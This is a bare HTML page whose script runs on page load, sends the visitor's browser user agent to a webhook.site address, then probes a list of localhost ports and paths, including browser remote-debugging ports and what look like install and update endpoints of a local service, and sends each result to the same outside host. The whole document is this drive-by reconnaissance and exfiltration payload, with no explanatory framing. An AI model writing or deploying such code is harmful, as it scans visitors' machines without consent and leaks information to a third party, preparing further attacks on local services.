<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
const EXFIL = 'https://webhook.site/f223977d-60e6-4b93-8ae2-201d550e29c0';

function send(data) {
  const encoded = encodeURIComponent(JSON.stringify(data)).slice(0, 1800);
  new Image().src = EXFIL + '?d=' + encoded;
}

async function probe(url) {
  try {
    const r = await fetch(url, {mode: 'no-cors'});
    return {url, status: 'reached'};
  } catch(e) {
    return {url, error: e.toString()};
  }
}

async function main() {
  send({status: 'alive', ua: navigator.userAgent});

  const targets = [
    'http://127.0.0.1:7345/state/device/deviceinfo',
    'http://127.0.0.1:7345/scpl/install',
    'http://127.0.0.1:7345/scpl/update/override_group',
    'http://127.0.0.1:8012/',
    'http://127.0.0.1:9223/json',
    'http://127.0.0.1:9222/json',
    'http://127.0.0.1:80/',
    'http://127.0.0.1:8080/',
  ];

  for (const url of targets) {
    const result = await probe(url);
    send(result);
    await new Promise(r => setTimeout(r, 500));
  }

  send({status: 'probe_complete'});
}

main();
</script>
</body>
</html>
